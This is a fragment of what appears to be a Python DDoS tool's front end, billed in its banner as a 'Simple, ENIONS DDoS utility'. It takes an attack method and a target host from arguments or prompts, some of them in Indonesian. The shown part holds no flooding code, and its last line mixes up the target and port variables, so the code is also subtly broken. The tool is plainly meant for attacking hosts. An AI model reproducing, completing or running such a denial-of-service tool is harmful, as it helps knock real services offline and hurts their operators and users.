...
███████╗██║██████╔╝██████╔╝╚█████╔╝██████╔╝
╚══════╝╚═╝╚═════╝░╚═════╝░░╚════╝░╚═════╝░
{RESET}Simple, ENIONS {RED}DDoS {RESET}utility
Made BY {YELLOW}GLOW•ENIONS✓✓✓
""")
        if args.METHOD:METHOD=args.METHOD.upper()
        else:METHOD=input(RESET+f'[{GREEN}Masukan Methode Tools BIGENIONS/CONNECTS/BOTS{RESET}]: {GREEN}').upper()
        METHODS=['BIGENIONS','CONNECTS','CONNECTS2','BOTS','URL']
        print(RESET+" Checking the method...")
        if not METHOD in METHODS:
            print(RED+"Metjode Tidak Di Termukan. There is available methods to use: "+", ".join([i for i in METHODS]))
            exit()
        if args.TARGET:TARGET=str(args.TARGET)
        else:TARGET=input(RESET+f'[{RED}Enter the target host (IP/URL){RESET}]: {RED}')
        if args.TARGET:TARGET=str(args.PORT)
